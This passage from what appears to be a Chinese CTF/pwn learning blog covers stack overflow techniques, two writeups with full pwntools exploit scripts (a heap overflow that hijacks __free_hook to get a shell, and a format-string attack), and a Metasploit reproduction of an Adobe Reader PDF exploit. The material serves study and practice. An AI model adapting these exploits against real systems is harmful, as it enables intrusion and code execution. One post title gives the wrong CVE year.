<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>当我们找到此漏洞时，我们就可以任意改写此变量之后的任意地址中的内容。常见的利用此漏洞进行改写的地址有：</p>
<ul>
<li><code>return addrss</code>中的内容</li>
<li>栈上其他变量的值</li>
<li>若待写变量在bss段，也能更改bss段中的内容</li>
</ul>
<p>我们想要改写地址的目的无非是<strong>直接或者间接地控制程序执行流程</strong>。</p>
<p>而利用栈溢出漏洞最常见的攻击方式，就是ROP了，了解可以看看这篇<a href="http://110.42.161.158/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/">ROP介绍</a>。</p>
<h2 id="栈溢出技巧"><a href="#栈溢出技巧" class="headerlink" title="栈溢出技巧"></a>栈溢出技巧</h2><p>由于本人水平有限，仅简单介绍CTF Wiki上的花式栈溢出技巧。</p>
<h3 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h3><p>合理使用<code>jmp esp</code>或<code>pop esp</code>指令将栈顶指针跳转到指定的地址，执行<code>ret</code>指令后将从该位置执行。我们常将构造的rop chain或shellcode写入一些可写入地址，然后将栈顶迁移到这些地址或后门函数，并在此处开栈执行设计好的流程。</p>
<h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h3><p>构造一个虚假的栈帧来控制程序的执行流</p>
<p>我感觉其实就是栈迁移，只不过当我们没有合适的指令改变栈顶指针时，通过<code>leave;ret</code>指令的重复使用，将栈帧迁移到我们指定的地址，然后将<code>rip</code>寄存器赋值为我们构造的rop chain。</p>
<p>先在合适的地方将我们构造的rop chain或shellcode，再利用栈溢出将<strong>指令的首地址+8</strong>的指针写入栈帧部分，再将<code>leave;ret</code>指令的地址写入return address。那么加上原本程序中的<code>leave;ret</code>，我们将执行两次。执行了两次后将栈顶搬到了指定地址，最后的<code>ret</code>指令就会将写入的指令写入<code>rip</code>寄存器，接着执行你设计的执行流。</p>
<p>根据下图加深印象：</p>
<p><img src="https://s2.loli.net/2022/03/04/FftxCI8Ey3KrHpb.png" alt="5"></p>
<p>需要注意的是，当我们将栈帧迁移之后，我们写入的执行指令可能是执行另一个函数，那么就会在当前这个位置开栈。如果我们开栈的位置距离一些写有重要数据的段不远，那么函数执行时将会覆盖掉一些，可能会令程序执行不下去导致dump。</p>
<h4 id="特殊的利用方法"><a href="#特殊的利用方法" class="headerlink" title="特殊的利用方法"></a>特殊的利用方法</h4><p>这是通过一道栈迁移题目新学到的。题中有一行代码是这样写的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:00000000004011CB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011CF                 mov     edx, 40h ; &#x27;@&#x27;  ; nbytes</span><br><span class="line">.text:00000000004011D4                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004011D7                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004011DC                 mov     eax, 0</span><br><span class="line">.text:00000000004011E1                 call    _read</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>我们知道变量的地址是通过变量到栈帧的偏移计算得到的。于是我们可以通过改变<code>rbp</code>的值来利用read函数对任意地址进行改写，甚至在bss段写入一段ropchain，最后执行，如果ropchain过长，可以在bss段上反复横跳来写入。</p>
<h3 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h3><p>我们知道如果程序开启了canary保护后，我们进行栈溢出操作就会报错。stack smash就是利用改写报错内容来打印出敏感内容。</p>
<p>原理：开启了canary保护后，若发现canary被修改，程序就会执行<code>__stack_chk_fail</code>函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向的是程序名。所以当我们利用栈溢出漏洞将argv[0]地址的内容改写为敏感信息的地址，那么就能泄露。</p>
<h3 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h3><p>内容主要是：仅改变这个地址的部分内容，一般为低位。</p>
<p>程序即使开了地址随机化保护，它的主要表现都集中在高位地址的变化，而低12位地址一般是偏移，是不会变化的，这也是我们利用低12位地址就能泄露libc版本原因。因此，我们仅需改写地址的低12位地址的偏移就能绕过PIE保护。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>STARCTF2022 pwn方向writeup</title>
    <url>/2022/04/21/starCTF-pwn%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>只能做一题(待续)</p>
<span id="more"></span>

<h2 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h2><h3 id="检查程序"><a href="#检查程序" class="headerlink" title="检查程序"></a>检查程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/rabbit/Desktop/*CTF2022/examination/examination&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  &#x27;/home/rabbit/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>是一个老师给学生打分、留评语的程序。</p>
<ul>
<li>老师最多添加6个学生并为其指定题数，其中添加学生会生成两个大小分别为0x30、0x20的chunk。</li>
<li>老师写评语会生成一个用户指定、有大小限制的chunk。</li>
<li>对review的索引依赖学生两个chunk中的指定内容。</li>
<li>write_review的读写长度，依赖0x20大小chunk的中最后一个内存块的内容。</li>
<li>在student的check_review，会检查学生的成绩是否及格(score&gt;59)，及格则泄露地址，并可以给任意一个地址内容+1。</li>
</ul>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><ul>
<li><p><strong>整数溢出</strong><br>student的pray功能会给对应的学生打上一个标记，而老师give_score时，检测到该标记位则会给学生-10分。因为在check_review中，检测时将该位看作了DWORD(一般是无符号)，因此当学生分数小于10则会产生一个整数溢出漏洞，从而通过检测。</p>
</li>
<li><p><strong>堆溢出</strong><br>由于write_review依赖于chunk中的指定内容，若我们能控制该chunk中的内容，则能够产生一个堆溢出漏洞。</p>
</li>
<li><p><strong>off-by-one</strong><br>由于check_review能增加内容大小，因此增大review读写大小能产生一个off-by-null漏洞。</p>
</li>
</ul>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用整数溢出漏洞通过check_review的检测，泄露堆地址并制造一个off-by-one漏洞。构造堆重叠，并且重叠覆盖下一个学生对应的两个chunk，释放掉该chunk后，能将review大小覆盖为更大的值，制造堆溢出漏洞。</p>
<p>由于能改变review读写大小，因此还能够通过释放掉非fast chunk来泄露libc地址。并且由于glibc版本为2.31，具有tcache机制，因此为了将chunk放入unsortedbin中需要比tcache范围大。</p>
<p>再利用堆溢出修改chunk中的内容以修改free_hook中的内容为system。然后将review地址改为’/bin/sh’地址，或将该地址赋值为’/bin/sh’，然后释放掉就能get shell。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./examination&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;124.70.130.92&#x27;</span>,<span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;choice&gt;&gt; &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line">role=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;enter the number of questions: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_score</span>():</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_test</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">index,comment,size=<span class="number">0</span></span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;which one? &gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> size:</span><br><span class="line">        sla(<span class="string">&quot;please input the size of comment: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;enter your comment:&quot;</span>,comment)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_parent</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;which student id to choose?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;reward! &#x27;</span>)</span><br><span class="line">    content=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input your id: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#0</span></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">write_review(<span class="number">0</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x18</span>)</span><br><span class="line">write_review(<span class="number">1</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">give_score()</span><br><span class="line"></span><br><span class="line">heap=check_review()-<span class="number">0x2a0</span></span><br><span class="line">sla(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>,<span class="built_in">str</span>((heap+<span class="number">0x2e0</span>)*<span class="number">10</span>))</span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">write_review(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x51&#x27;</span>)</span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#2</span></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#3</span></span><br><span class="line">write_review(<span class="number">2</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#4</span></span><br><span class="line">write_review(<span class="number">4</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#5</span></span><br><span class="line">write_review(<span class="number">5</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#6</span></span><br><span class="line">write_review(<span class="number">6</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x850</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(heap+<span class="number">0x870</span>)</span><br><span class="line">payload+=p64(<span class="number">0x450</span>)+p64(<span class="number">0x451</span>)</span><br><span class="line">write_review(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">role(<span class="number">1</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">96</span></span><br><span class="line"></span><br><span class="line">libc=elf.libc</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ECB80</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(free_hook)</span><br><span class="line">write_review(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">write_review(<span class="number">6</span>,p64(system))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd30</span>)</span><br><span class="line">write_review(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">role(<span class="number">0</span>)</span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">&quot;which student id to choose?&quot;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>wustctf2020-babyfmt-writeup</title>
    <url>/2022/03/03/wustctf2020-babyfmt-writeup/</url>
    <content><![CDATA[<p>函数就不放了</p>
<span id="more"></span>

<p>除了利用字符串格式化漏洞的操作外，还要了解FILE结构。</p>
<p>在执行程序时，通常会打开三标准文件：stdin(标准输入文件)，stdout(标准输出文件)和stderr(标准输出文件)，且后面两个都对应终端的屏幕。</p>
<p>定义了一个指向FILE结构的指针来接受这个返回值，存放在bss段。解这道题就需要利用这点。</p>
<p>更具体的内容可以看看<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">CTF wiki</a>。</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这道题有三个功能，leak,fmt_attack,get_flag。</p>
<p>效果就如他们的名字一样，特殊的地方在于，leak和fmt_attack受一个栈上参数限制导致只能执行一次。但由于是在栈上，所以可以通过格式化字符串去改写，于是就能重复使用了。</p>
<p>栈上地址我们可以利用程序开头询问时间的漏洞，输入三个与’%ld’不对应的字符，则不会写入内存，而爆出栈上内容，从而泄露。</p>
<p>get_flag中有一个判断条件，是输入一串字符串与bss段上的secret进行比对。我们可以爆出这个值，但是由于leak只能泄露一位，我们需要重复利用leak，要想重复利用那么就要使用很多次fmt_attack才能将secret全部爆出。因此我们选择使用fmt_attack将secret改为’\0’。除此之外，再get flag之前会关闭stdout。</p>
<p>根据开篇提的知识点，解这道题需要将保存着<code>_IO_2_1_stdout_</code>指针的地址内容改写为<code>_IO_2_1_stderr_</code>。由于这两个指针的内容仅最后两个字节不同，因此我们只需要leak出<code>_IO_2_1_stderr_</code>的倒数第二位即可。</p>
<p>最后调用get_flag就能拿到flag了。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node4.buuoj.cn&#x27;,28477)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_file=elf.libc</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;tell me the time:&quot;</span>,<span class="string">&#x27;a\na\na&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;ok! time is &quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0xbd5</span></span><br><span class="line">leak_addr=stack_addr+<span class="number">28</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">secret_addr=elf_base+<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(secret_addr)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">stderr=elf_base+<span class="number">0x202040</span></span><br><span class="line">stdout=elf_base+<span class="number">0x202020</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stderr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stdout)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">payload=p64(stderr+<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak=u8(io.recv(<span class="number">1</span>))</span><br><span class="line">val=(leak&lt;&lt;<span class="number">8</span>)+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(val)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(val).ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stdout)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;If you can open the door!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>参数入栈顺序</title>
    <url>/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/</url>
    <content><![CDATA[<p>调用函数时，会生成一个栈帧，而这个过程中会涉及到如何向该调用函数传参的问题。</p>
<span id="more"></span>

<p>使用c编写一个程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, i, ++i, i++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	test();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行程序，输出结果为’2 2 0’。</p>
<p>结果说明函数的参数的入栈顺序是从右往左的：</p>
<ol>
<li>先执行<code>i++</code>，将返回的<code>0</code>压入栈，此时<code>i=1</code></li>
<li>再执行<code>++i</code>，将返回的<code>2</code>压入栈，此时<code>i=2</code></li>
<li>最后压入<code>i</code></li>
</ol>
<p>以上是我们试出的结果，实际上这是因为函数调用中会遵循<strong>函数调用约定</strong>。该规则规定了以为下几方面：</p>
<ul>
<li>函数参数的传递顺序和方法</li>
<li>栈的维护方式</li>
<li>名字修饰(name-mangling)策略</li>
</ul>
<p>其中最常见的参数传递方式是通过<strong>堆栈传参</strong>：调用函数将参数压入栈中，被调用函数以相对栈基指针的偏移来访问栈中参数，类似于访问<code>bp[offset]</code>。而对于有多个参数的函数，调用约定规定将参数从右到左(或从左到右)依次入栈。某些约定还允许通过寄存器来传参。</p>
<p>常见调用约定具体可见该<a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">文章</a>。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>初次尝试，CVE-2020-2883复现与分析</title>
    <url>/2022/04/27/%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95%EF%BC%8CCVE-2020-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>个人复现的第一个漏洞，从《漏洞战争》一书和别人的复现分析中学到了许多。</p>
<span id="more"></span>

<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2883">官方文档</a></p>
<blockquote>
<p>Stack-based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010. NOTE: some of these details are obtained from third party information.<br>References</p>
</blockquote>
<p>该漏洞是 Adobe Reader 和 Acrobat 的 CoolType.dll 库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。</p>
<h2 id="msf复现"><a href="#msf复现" class="headerlink" title="msf复现"></a>msf复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">攻击机环境</td>
<td align="left">kali linux</td>
</tr>
<tr>
<td align="left">靶机环境</td>
<td align="left">Windows XP SP3</td>
</tr>
</tbody></table>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br></pre></td></tr></table></figure>

<p>结果有两个，一个是基于浏览器的，一个是基于软件的，我们选择基于软件的，也就是第二个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br></pre></td></tr></table></figure>

<h4 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec </span><br><span class="line">payload =&gt; windows/exec</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br></pre></td></tr></table></figure>

<p>让我们最后能弹出计算器</p>
<h4 id="设置并生成PDF"><a href="#设置并生成PDF" class="headerlink" title="设置并生成PDF"></a>设置并生成PDF</h4><figure class="highlight plaintext"><figcaption><span>exploit(windows/fileformat/adobe_cooltype_sing) > set FILENAME test.pdf</span></figcaption><table><tr><td class="code"><pre><span class="line">FILENAME =&gt; test.pdf                                                                                                                                                                                                                         </span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit                                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">[*] Creating &#x27;test.pdf&#x27; file...                                                                                                                                                                                                              </span><br><span class="line">[+] test.pdf stored at /home/rabbit/.msf4/local/test.pdf</span><br></pre></td></tr></table></figure>

<p>然后我们将该文件放入靶机并打开</p>
